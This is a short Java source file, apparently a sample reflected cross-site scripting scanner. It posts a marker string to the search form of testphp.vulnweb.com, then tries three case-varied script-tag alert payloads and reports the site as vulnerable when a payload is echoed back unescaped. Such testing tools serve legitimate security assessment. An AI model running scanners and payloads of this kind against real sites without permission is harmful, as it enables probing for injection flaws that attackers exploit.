package main;

import java.util.ArrayList;

public class SampleXSSTest {
	public static void main(String[] args) {
		ArrayList<String> Payloads = new ArrayList<String>() {
			{
				add(JBBL.util.URLen("<script>alert(1)</script>"));
				add(JBBL.util.URLen("<scrIpt>alert(1)</scrIpt>"));
				add(JBBL.util.URLen("<sCript>alert(1)</sCript>"));
			}
		};
		JBBL.HTTP conn = new JBBL.HTTP("testphp.vulnweb.com");
		conn.init();
		conn.Method = "POST";
		conn.Path = "/search.php?test=query";
		// Check
		conn.Data = "searchFor=TESTTESTTEST&goButton=go";
		if(conn.send().contains("TESTTESTTEST")) {
			System.out.println("Maybe Vulnerable");
			for(int i = 0;i<Payloads.size();i++) {
				conn.Data = "searchFor="+Payloads.get(i)+"&goButton=go";
				if(conn.send().contains(JBBL.util.URLde(Payloads.get(i)))) {
					System.out.println("CONFIRMED: Vulnerable | Payload: "+Payloads.get(i));
				}
			}
 		}
		//conn.Data = "searchFor="+Payload+"&goButton=go";
	}
}
